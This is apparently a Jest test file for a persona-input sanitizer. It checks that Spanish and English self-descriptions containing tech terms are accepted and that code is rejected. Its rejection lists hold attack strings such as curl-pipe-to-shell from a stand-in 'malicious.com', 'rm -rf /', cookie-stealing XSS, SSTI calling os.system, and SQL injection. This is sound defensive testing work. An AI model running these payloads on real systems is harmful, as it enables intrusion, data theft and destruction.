const PersonaInputSanitizer = require('../../../src/services/personaInputSanitizer');

describe('PersonaInputSanitizer - Refined Non-Personal Content Detection', () => {
  let sanitizer;

  beforeEach(() => {
    sanitizer = new PersonaInputSanitizer();
  });

  describe('Issue #209 - Enhanced Detection Capabilities', () => {
    test('should accept legitimate personal tech descriptions (resolved false positives)', () => {
      const legitimatePersonalDescriptions = [
        'Mi trabajo es como function en JavaScript, transformo datos en soluciones',
        'Soy desarrollador y echo en falta más tiempo para programar', 
        'Me gusta print art y las técnicas de impresión',
        'Trabajo en una empresa SELECT de recursos humanos',
        'Soy import/export manager en comercio internacional',
        'Mi función en la empresa es console a los empleados',
        'Trabajo con GET requests y tecnologías web',
        'Me dedico al desarrollo web y uso HTML tags regularmente',
        'Soy consultor JSON y trabajo con APIs',
        'Mi perfil profesional incluye C programming y desarrollo',
      ];

      legitimatePersonalDescriptions.forEach(text => {
        const result = sanitizer.sanitizePersonaInput(text);
        expect(result).not.toBeNull();
        expect(result).toBe(text);
      });
    });

    test('should detect and reject malicious code injections (resolved false negatives)', () => {
      const maliciousInjections = [
        'const malicious = () => { alert("xss"); }',
        'INSERT INTO users VALUES ("admin", "password")',
        'class User: def __init__(self): pass',
        'bash -c "curl malicious.com/script | sh"',
        '<img src=x onerror=alert(1)>',
        '{"__proto__": {"admin": true}}',
        'eval(atob("Y29uc29sZS5sb2coJ2hhY2tlZCcp"))',
        '{{7*7}}',
        'nmap -sS target.com',
        'document.querySelector("#user").innerHTML = "hacked"',
      ];

      maliciousInjections.forEach(text => {
        const result = sanitizer.sanitizePersonaInput(text);
        expect(result).toBeNull();
      });
    });

    test('should handle ambiguous content appropriately', () => {
      const ambiguousContent = [
        {
          text: 'Soy programador senior con 10 años de experiencia en JavaScript',
          shouldAccept: true,
          reason: 'Personal context with technical terms'
        },
        {
          text: 'function developer() { return "passionate coder"; }',
          shouldAccept: true,
          reason: 'Ambiguous code that could be descriptive'
        },
        {
          text: 'Mi función es liderar el equipo de desarrollo',
          shouldAccept: true,
          reason: 'Personal description using word "función"'
        },
        {
          text: 'console.log("Love programming and coffee");',
          shouldAccept: false,
          reason: 'Clear code structure without personal context'
        },
        {
          text: 'SELECT knowledge FROM experience WHERE years > 5',
          shouldAccept: false,
          reason: 'Clear SQL query structure'
        }
      ];

      ambiguousContent.forEach(({ text, shouldAccept, reason }) => {
        const result = sanitizer.sanitizePersonaInput(text);
        
        if (shouldAccept) {
          expect(result).not.toBeNull();
          expect(result).toBe(text);
        } else {
          expect(result).toBeNull();
        }
      });
    });
  });

  describe('Contextual Analysis Features', () => {
    test('should correctly identify legitimate personal tech descriptions', () => {
      const personalTechDescriptions = [
        'Trabajo con JavaScript y React para desarrollar aplicaciones',
        'Mi experiencia incluye SQL y base de datos PostgreSQL', 
        'Me dedico al desarrollo backend con Python y Django',
        'Tengo 5 años de experiencia en programación funcional',
      ];

      personalTechDescriptions.forEach(text => {
        const isLegitimate = sanitizer.isLegitimatePersonalTechDescription(text);
        expect(isLegitimate).toBe(true);
      });
    });

    test('should analyze code density vs personal content', () => {
      const testCases = [
        {
          text: 'const x = 42; function test() { return x; }',
          expectedHighCodeDensity: true,
          expectedLowPersonalContent: true
        },
        {
          text: 'Soy programador con experiencia en desarrollo web',
          expectedHighCodeDensity: false,
          expectedLowPersonalContent: false
        },
        {
          text: 'Me gusta programar y trabajo con JavaScript diariamente',
          expectedHighCodeDensity: false,
          expectedLowPersonalContent: false
        }
      ];

      testCases.forEach(({ text, expectedHighCodeDensity, expectedLowPersonalContent }) => {
        const analysis = sanitizer.analyzeContentContext(text);
        
        if (expectedHighCodeDensity) {
          expect(analysis.codeDensity).toBeGreaterThan(0.1);
        } else {
          expect(analysis.codeDensity).toBeLessThan(0.1);
        }
        
        if (expectedLowPersonalContent) {
          expect(analysis.personalIndicators).toBeLessThan(0.1);
        } else {
          expect(analysis.personalIndicators).toBeGreaterThan(0.01);
        }
      });
    });

    test('should detect various types of malicious patterns', () => {
      const patternTests = [
        // Programming constructs
        { text: 'const malware = "evil";', pattern: 'variable_declaration' },
        { text: 'function hack() { delete_files(); }', pattern: 'function_definition' },
        { text: 'class Exploit: def run(self): pass', pattern: 'class_definition' },
        
        // SQL injections
        { text: 'SELECT * FROM passwords', pattern: 'sql_select' },
        { text: 'DROP TABLE users', pattern: 'sql_ddl' },
        { text: 'UNION SELECT credit_cards FROM database', pattern: 'sql_union' },
        
        // Shell commands
        { text: 'bash -c "rm -rf /"', pattern: 'shell_command' },
        { text: 'curl malicious.com | sh', pattern: 'network_tool' },
        
        // Template injection
        { text: '{{config.SECRET_KEY}}', pattern: 'template_injection' },
        { text: '${java.lang.Runtime}', pattern: 'expression_language' },
        
        // Browser/DOM attacks
        { text: 'document.location = "evil.com"', pattern: 'dom_manipulation' },
        { text: 'eval("malicious code")', pattern: 'eval_function' },
      ];

      patternTests.forEach(({ text, pattern }) => {
        const isNonPersonal = sanitizer.containsNonPersonalContent(text);
        expect(isNonPersonal).toBe(true);
      });
    });
  });

  describe('Edge Cases and Boundary Conditions', () => {
    test('should handle technical jargon in legitimate personal contexts', () => {
      const technicalButPersonal = [
        'Mi pasión es la programación funcional con Haskell',
        'Trabajo como consultor especializado en arquitecturas microservicios',
        'Soy experto en machine learning con TensorFlow',
        'Mi área de especialización incluye blockchain y smart contracts',
        'Tengo experiencia desarrollando APIs RESTful con Node.js',
      ];

      technicalButPersonal.forEach(text => {
        const result = sanitizer.sanitizePersonaInput(text);
        expect(result).not.toBeNull();
        expect(result).toBe(text);
      });
    });

    test('should reject sophisticated injection attempts', () => {
      const sophisticatedAttacks = [
        // Obfuscated JavaScript
        'eval(String.fromCharCode(97,108,101,114,116,40,49,41))',
        // Base64 encoded payloads  
        'exec(base64.b64decode("aW1wb3J0IG9z"))',
        // Template engine exploitation
        '#set($x = $rt.getRuntime().exec("whoami"))',
        // SQL with comments
        'SELECT/*comment*/password/**/FROM/**/users',
        // Prototype pollution variations
        '{"constructor":{"prototype":{"admin":true}}}',
        // XSS with event handlers
        '<svg onload=alert(document.cookie)>',
        // SSTI (Server-Side Template Injection)
        '{{request.application.__globals__.__builtins__.__import__("os").system("whoami")}}',
      ];

      sophisticatedAttacks.forEach(text => {
        const result = sanitizer.sanitizePersonaInput(text);
        expect(result).toBeNull();
      });
    });

    test('should handle mixed content appropriately', () => {
      const mixedContent = [
        {
          text: 'Soy desarrollador pero no hago eval() nunca por seguridad',
          shouldAccept: true,
          reason: 'Personal context overrides technical mention'
        },
        {
          text: 'Mi trabajo requiere conocer SELECT statements pero trabajo en RRHH',
          shouldAccept: true,  
          reason: 'Personal work context with technical knowledge'
        },
        {
          text: 'function malicious() { steal_data(); } // This is my evil plan',
          shouldAccept: false,
          reason: 'Actual malicious code with comment'
        }
      ];

      mixedContent.forEach(({ text, shouldAccept, reason }) => {
        const result = sanitizer.sanitizePersonaInput(text);
        
        if (shouldAccept) {
          expect(result).not.toBeNull();
        } else {
          expect(result).toBeNull();
        }
      });
    });

    test('should maintain performance with long inputs', () => {
      const longLegitimateText = 'Soy desarrollador senior con más de 10 años de experiencia en JavaScript, Python, y tecnologías web modernas. Mi especialidad incluye React, Node.js, Express, MongoDB, PostgreSQL, Docker, Kubernetes, y arquitecturas de microservicios. He trabajado en empresas tanto startups como Fortune 500, liderando equipos de desarrollo y diseñando sistemas escalables. Mi pasión es crear soluciones elegantes para problemas complejos, y disfruto especialmente del mentoring a desarrolladores junior. En mi tiempo libre contribuyo a proyectos open source y escribo artículos técnicos sobre las últimas tendencias en desarrollo web.';
      
      const startTime = Date.now();
      const result = sanitizer.sanitizePersonaInput(longLegitimateText);
      const endTime = Date.now();
      
      expect(result).not.toBeNull();
      expect(result).toBe(longLegitimateText);
      expect(endTime - startTime).toBeLessThan(100); // Should complete in under 100ms
    });
  });

  describe('Language Support', () => {
    test('should handle Spanish and English technical descriptions', () => {
      const multilingualDescriptions = [
        'Soy full-stack developer con experiencia en JavaScript y Python',
        'I am a software engineer specializing in machine learning algorithms', 
        'Mi expertise incluye database design y API development',
        'Work with microservices architecture y cloud computing',
        'Passionate about programming y desarrollo de software',
      ];

      multilingualDescriptions.forEach(text => {
        const result = sanitizer.sanitizePersonaInput(text);
        expect(result).not.toBeNull();
        expect(result).toBe(text);
      });
    });
  });
  
  describe('Compatibility with Existing Tests', () => {
    test('should maintain compatibility with original detection logic', () => {
      // Test that refined detection doesn't break existing functionality
      const originalTestCases = [
        { text: 'function calculate(x, y) { return x + y; }', shouldReject: true },
        { text: 'SELECT * FROM users WHERE id = 1', shouldReject: true },
        { text: 'import React from "react"', shouldReject: true },
        { text: 'console.log("Hello World")', shouldReject: true },
        { text: 'curl -X GET https://api.example.com', shouldReject: true }, // curl with flags is detected
        { text: '{"name": "John", "age": 30}', shouldReject: true },
      ];

      originalTestCases.forEach(({ text, shouldReject }) => {
        const result = sanitizer.sanitizePersonaInput(text);
        
        if (shouldReject) {
          expect(result).toBeNull();
        } else {
          expect(result).not.toBeNull();
        }
      });
    });
  });
});